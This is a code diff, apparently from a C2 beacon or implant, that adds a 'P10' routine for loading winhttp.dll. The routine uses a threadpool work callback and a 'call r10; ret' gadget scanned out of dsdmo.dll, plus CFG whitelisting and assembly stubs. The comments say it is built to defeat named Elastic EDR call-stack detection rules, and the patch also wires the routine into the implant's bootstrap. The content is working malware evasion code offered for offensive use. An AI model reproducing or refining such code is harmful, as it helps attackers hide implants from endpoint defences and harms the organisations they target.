@@ -63,8 +63,130 @@ FUNC VOID NaxGetInternalIp( PNAX_INSTANCE Nax, PCHAR out, UINT32 cap ) {
     Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, adapterInfo );
 }
 
-/* ========= [ domain helper ] ========= */
+/* ========= [ P10 - threadpool + call-gadget library load ] =========
+ *
+ * Loading winhttp.dll (a network module) with the beacon's unbacked frames
+ * on the call stack matches Elastic's "network module loaded from suspicious
+ * unbacked memory" rule family ("ntdll|kernelbase|...|Unbacked"), and a load
+ * issued through a threadpool callback alone matches the API-proxy callback
+ * rule. This helper breaks BOTH signatures the LibTPLoadLib way:
+ *
+ *   TpWork callback --JMP--> dsdmo.dll `call r10; ret` gadget
+ *
+ * The JMP (vs CALL) pushes no return address, so the callback's own frame
+ * never appears in the walk; the gadget's CALL puts a dsdmo.dll (image-
+ * backed, non-flagged) address directly between the Tpp dispatch frames and
+ * kernelbase!LoadLibraryW, so the image-load event's call-stack summary
+ * reads: ntdll(Tpp worker) | dsdmo | kernelbase | ntdll - no unbacked frame
+ * adjacent to the load, no callback-API signature.
+ *
+ * dsdmo.dll carries the Almond/LibTPLoadLib gadget shape
+ * (41 FF D2 33 C0 48 83 C4 28 C3 = call r10; xor eax,eax; add rsp,28h; ret)
+ * which was stable across Windows 10 builds up to 10.0.26100.1882 and was
+ * REMOVED in 10.0.26100.3323 - the scan below validates the exact 10-byte
+ * sequence at runtime, and on any miss (DLL absent, gadget moved, TP APIs
+ * unresolved) falls back to a plain LoadLibraryW: the pre-P10 behavior,
+ * never a failure. CFG: the callback address is whitelisted for the
+ * enclosing stomped module via NtQueryVirtualMemory + NaxCfgAddTarget.
+ */
 
+typedef struct _NAX_TP_LOAD {
+    __typeof__( LoadLibraryW )* Fn;
+    const WCHAR* Name;
+    PVOID        Gadget;
+} NAX_TP_LOAD;
+
+/* naked TP callback: rcx=Inst, rdx=NAX_TP_LOAD*. sub rsp,0x28 pre-allocates
+ * the space the gadget's `add rsp,0x28` frees, so the gadget's final ret
+ * pops the real return address into TppWorkpExecuteCallback. */
+__attribute__( ( naked ) )
+static VOID CALLBACK NaxTpLoadWorkCb( PTP_CALLBACK_INSTANCE Inst, PVOID Ctx ) {
+    (void)Inst;
+    __asm__ __volatile__(
+    ".intel_syntax noprefix\n"
+    "  sub   rsp, 0x28\n"
+    "  mov   r10, [rdx+0x00]\n"      /* Fn (LoadLibraryW) */
+    "  mov   rcx, [rdx+0x08]\n"      /* Name (const WCHAR*) */
+    "  jmp   qword ptr [rdx+0x10]\n" /* Gadget: call r10; xor eax,eax; add rsp,28h; ret */
+    );
+}
+
+/* Scan an executable section for the dsdmo call-gadget. */
+FUNC static PVOID NaxFindCallGadget( PBYTE mod ) {
+    PIMAGE_DOS_HEADER dos  = (PIMAGE_DOS_HEADER)mod;
+    PIMAGE_NT_HEADERS nt   = (PIMAGE_NT_HEADERS)( mod + dos->e_lfanew );
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION( nt );
+    for ( WORD i = 0; i < nt->FileHeader.NumberOfSections; i++ ) {
+        if ( ! ( sec[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) continue;
+        PBYTE p   = mod + sec[ i ].VirtualAddress;
+        DWORD len = sec[ i ].Misc.VirtualSize;
+        if ( len < 10 ) continue;
+        for ( DWORD j = 0; j < len - 9; j++ ) {
+            if ( p[ j     ] == 0x41 && p[ j + 1 ] == 0xFF && p[ j + 2 ] == 0xD2 &&
+                 p[ j + 3 ] == 0x33 && p[ j + 4 ] == 0xC0 &&
+                 p[ j + 5 ] == 0x48 && p[ j + 6 ] == 0x83 && p[ j + 7 ] == 0xC4 &&
+                 p[ j + 8 ] == 0x28 && p[ j + 9 ] == 0xC3 )
+                return (PVOID)( p + j );
+        }
+    }
+    return NULL;
+}
+
+FUNC HMODULE NaxTpLoadLibraryW( PNAX_INSTANCE Nax, const WCHAR* name ) {
+    /* already loaded? PEB walk first - no event at all */
+    HMODULE hm = NaxGetModule( H_WINHTTP_DLL );
+    if ( hm )
+        return hm;
+
+    if ( ! Nax->Kernel32.LoadLibraryW || ! Nax->Ntdll.TpAllocWork ||
+         ! Nax->Ntdll.TpPostWork || ! Nax->Ntdll.TpWaitForWork ||
+         ! Nax->Ntdll.TpReleaseWork )
+        return Nax->Kernel32.LoadLibraryW( name );   /* plain fallback */
+
+    /* gadget carrier: dsdmo.dll (audio effect; never a call-stack rule target) */
+    PBYTE carrier = B_PTR( NaxGetModule( H_DSDMO_DLL ) );
+    if ( ! carrier ) {
+        WCHAR car[] = { 'd', 's', 'd', 'm', 'o', '.', 'd', 'l', 'l', '\0' };
+        carrier = B_PTR( Nax->Kernel32.LoadLibraryW( car ) );
+    }
+    PVOID gadget = carrier ? NaxFindCallGadget( carrier ) : NULL;
+    if ( ! gadget ) {
+        NaxDbgx( Nax, "p10: no call gadget - plain load" );
+        return Nax->Kernel32.LoadLibraryW( name );   /* plain fallback */
+    }
+
+    /* whitelist the naked callback for CFG in its enclosing module */
+    if ( Nax->CfgEnabled && Nax->Ntdll.NtQueryVirtualMemory ) {
+        MEMORY_BASIC_INFORMATION mbi;
+        MmZero( &mbi, sizeof( mbi ) );
+        if ( Nax->Ntdll.NtQueryVirtualMemory( NtCurrentProcess(), (PVOID)NaxTpLoadWorkCb, 0, &mbi, sizeof( mbi ), NULL ) == 0 && mbi.AllocationBase )
+            NaxCfgAddTarget( Nax, mbi.AllocationBase, (PVOID)NaxTpLoadWorkCb );
+    }
+
+    NAX_TP_LOAD load;
+    load.Fn     = ( __typeof__( LoadLibraryW )* )Nax->Kernel32.LoadLibraryW;
+    load.Name   = name;
+    load.Gadget = gadget;
+
+    PTP_WORK work = NULL;
+    Nax->Ntdll.TpAllocWork( &work, (PTP_WORK_CALLBACK)NaxTpLoadWorkCb, &load, NULL );
+    if ( ! work )
+        return Nax->Kernel32.LoadLibraryW( name );   /* plain fallback */
+
+    Nax->Ntdll.TpPostWork( work );
+    Nax->Ntdll.TpWaitForWork( work, FALSE );
+    Nax->Ntdll.TpReleaseWork( work );
+
+    hm = NaxGetModule( H_WINHTTP_DLL );
+    if ( hm ) {
+        NaxDbgx( Nax, "p10: %p loaded via tp+gadget %p", (PVOID)hm, gadget );
+        return hm;
+    }
+
+    return Nax->Kernel32.LoadLibraryW( name );       /* plain fallback */
+}
+
+/* ========= [ domain helper ] ========= */
 FUNC VOID NaxGetDomain( PNAX_INSTANCE Nax, PCHAR out, UINT32 cap ) {
     WCHAR wbuf[256];
     MmZero( wbuf, sizeof( wbuf ) );
@@ -189,6 +311,7 @@ FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
 
     Nax->Ntdll.TpAllocWork                    = (PVOID)NaxGetProc( hNtdll, H_TPALLOCWORK );
     Nax->Ntdll.TpPostWork                     = (PVOID)NaxGetProc( hNtdll, H_TPPOSTWORK );
+    Nax->Ntdll.TpWaitForWork                  = (PVOID)NaxGetProc( hNtdll, H_TPWAITFORWORK );
     Nax->Ntdll.TpReleaseWork                  = (PVOID)NaxGetProc( hNtdll, H_TPRELEASEWORK );
     Nax->Ntdll.RtlInitializeCriticalSection   = (PVOID)NaxGetProc( hNtdll, H_RTLINITIALIZECRITICALSECTION );
     Nax->Ntdll.RtlEnterCriticalSection        = (PVOID)NaxGetProc( hNtdll, H_RTLENTERCRITICALSECTION );
@@ -350,9 +473,10 @@ FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
     Nax->Iphlpapi.GetAdaptersInfo  = (PVOID)NaxGetProc( hIphlpapi, H_GETADAPTERSINFO );
 
 #if NAX_TRANSPORT_PROFILE != NAX_TRANSPORT_SMB
-    /* - winhttp (HTTP transport only) - */
+    /* - winhttp (HTTP transport only) - P10: load via threadpool+call-gadget
+     *  proxy (falls back to plain LoadLibraryW on any missing piece) */
     WCHAR whttp[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0' };
-    HMODULE hWinhttp  = Nax->Kernel32.LoadLibraryW( whttp );
+    HMODULE hWinhttp  = NaxTpLoadLibraryW( Nax, whttp );
     NaxDbgx( Nax, "winhttp=%p bcrypt=%p iphlpapi=%p", hWinhttp, hBcrypt, hIphlpapi );
     if ( ! hWinhttp ) {
         Nax->Ntdll.RtlFreeHeap( heap, 0, Nax );
